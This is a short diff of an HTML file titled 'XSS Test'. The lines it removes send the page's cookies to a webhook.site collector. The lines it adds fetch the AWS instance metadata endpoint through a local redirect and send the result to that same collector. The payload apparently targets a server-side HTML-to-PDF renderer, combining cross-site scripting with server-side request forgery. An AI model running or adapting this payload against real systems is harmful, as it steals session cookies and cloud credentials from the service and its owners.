@@ -3,11 +3,21 @@
 <head><title>XSS Test</title></head>
 <body>
   <h1>JS Execution Test</h1>
-  <script>
-    // שולח בקשה לשרת שלך כדי לוודא שה-JS אכן רץ
-    fetch('https://webhook.site/565628b3-9556-4536-8e01-88059325cb8d?cookie=' + encodeURIComponent(document.cookie));
-    // מציג טקסט כדי לוודא שה-JS רץ גם בדף ה-PDF
-    document.body.insertAdjacentHTML('beforeend', '<p style="color:red">✅ JS Executed!</p>');
-  </script>
+<script>
+  fetch('http://127.0.0.1/redir.php?url=http://169.254.169.254/latest/meta-data/')
+    .then(res => res.text())
+    .then(data => {
+      fetch('https://webhook.site/565628b3-9556-4536-8e01-88059325cb8d?cookie=' + encodeURIComponent(data));
+      document.body.innerHTML = '<pre>' + data + '</pre>';
+    })
+    .catch(e => {
+      document.body.innerHTML = 'Error: ' + e.message;
+    });
+</script>
 </body>
 </html>
+
+
+
+
+
